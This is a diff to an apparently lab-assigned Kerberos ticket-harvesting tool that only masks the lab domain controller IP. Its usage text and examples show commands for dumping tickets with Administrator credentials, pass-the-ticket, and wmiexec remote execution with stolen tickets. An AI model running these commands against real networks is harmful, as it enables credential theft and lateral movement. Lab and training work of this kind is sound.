@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 intercept_kerberos_tickets.py — Kerberos Ticket Harvesting
-Lab: lab.local | DC: 192.168.1.18
+Lab: lab.local | DC: 192.168.x.x
 Assigned to: Seif
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -49,10 +49,10 @@ This script covers 4 harvesting techniques:
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 USAGE
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  python3 intercept_kerberos_tickets.py --method dump    -t 192.168.1.18 -u Administrator -p 'Testing123!'
+  python3 intercept_kerberos_tickets.py --method dump    -t 192.168.x.x -u Administrator -p 'Testing123!'
   python3 intercept_kerberos_tickets.py --method ccache  --ccache-dir /tmp
   python3 intercept_kerberos_tickets.py --method convert --input ticket.kirbi --output ticket.ccache
-  python3 intercept_kerberos_tickets.py --method ptt     --ccache ticket.ccache -t 192.168.1.18
+  python3 intercept_kerberos_tickets.py --method ptt     --ccache ticket.ccache -t 192.168.x.x
 """
 
 import argparse
@@ -96,7 +96,7 @@ BANNER = f"""
 {M}{BO}╔══════════════════════════════════════════════════════╗
 ║   K E R B E R O S   T I C K E T   H A R V E S T    ║
 ║   Dump | Parse | Convert | Pass-the-Ticket          ║
-║   lab.local  |  192.168.1.18                        ║
+║   lab.local  |  192.168.x.x                        ║
 ╚══════════════════════════════════════════════════════╝{RS}
 """
 
@@ -506,7 +506,7 @@ def _kirbi_to_ccache(kirbi_path, ccache_path):
         print(f"  {G}[+] Converted! Saved to: {ccache_path}{RS}")
         print(f"\n  {C}Use it:{RS}")
         print(f"  {W}  export KRB5CCNAME={ccache_path}{RS}")
-        print(f"  {W}  python3 wmiexec.py -k -no-pass lab.local/Administrator@192.168.1.18{RS}")
+        print(f"  {W}  python3 wmiexec.py -k -no-pass lab.local/Administrator@192.168.x.x{RS}")
 
     except Exception as e:
         print(f"  {R}[!] Conversion failed: {e}{RS}")
@@ -773,7 +773,7 @@ def main():
             print(f"{R}[!] --method ptt requires --ccache-file{RS}")
             sys.exit(1)
         technique_pass_the_ticket(
-            args.ccache_file, args.target or "192.168.1.18",
+            args.ccache_file, args.target or "192.168.x.x",
             args.domain, args.username
         )
 
@@ -784,7 +784,7 @@ def main():
             password = getpass.getpass("Password: ")
         request_ticket(
             args.username, password, args.domain,
-            args.target or "192.168.1.18", nt_hash,
+            args.target or "192.168.x.x", nt_hash,
             target_spn=args.spn or ""
         )
 
@@ -806,18 +806,18 @@ Methods:
   request  Request fresh TGT/TGS and save to .ccache
 
 Examples:
-  python3 intercept_kerberos_tickets.py --method dump -t 192.168.1.18 -u Administrator -p 'Testing123!'
+  python3 intercept_kerberos_tickets.py --method dump -t 192.168.x.x -u Administrator -p 'Testing123!'
   python3 intercept_kerberos_tickets.py --method ccache --ccache-dir /tmp
   python3 intercept_kerberos_tickets.py --method ccache --ccache-file /tmp/krb5cc_0
   python3 intercept_kerberos_tickets.py --method convert --input ticket.kirbi --output ticket.ccache
-  python3 intercept_kerberos_tickets.py --method ptt --ccache-file admin.ccache -t 192.168.1.18 -u Administrator
-  python3 intercept_kerberos_tickets.py --method request -t 192.168.1.18 -u Administrator -p 'Testing123!' --spn cifs/WIN-RM9TRCNVS9P.lab.local
+  python3 intercept_kerberos_tickets.py --method ptt --ccache-file admin.ccache -t 192.168.x.x -u Administrator
+  python3 intercept_kerberos_tickets.py --method request -t 192.168.x.x -u Administrator -p 'Testing123!' --spn cifs/WIN-RM9TRCNVS9P.lab.local
         """
     )
     p.add_argument("--method",      required=True,
                    choices=["dump","ccache","convert","ptt","request"],
                    help="Technique to use")
-    p.add_argument("-t",  "--target",     default="192.168.1.18",  help="Target IP/hostname")
+    p.add_argument("-t",  "--target",     default="192.168.x.x",  help="Target IP/hostname")
     p.add_argument("-u",  "--username",   default="Administrator", help="Username")
     p.add_argument("-p",  "--password",   default="",              help="Password")
     p.add_argument("--nt-hash",           default="",              help="NT hash")
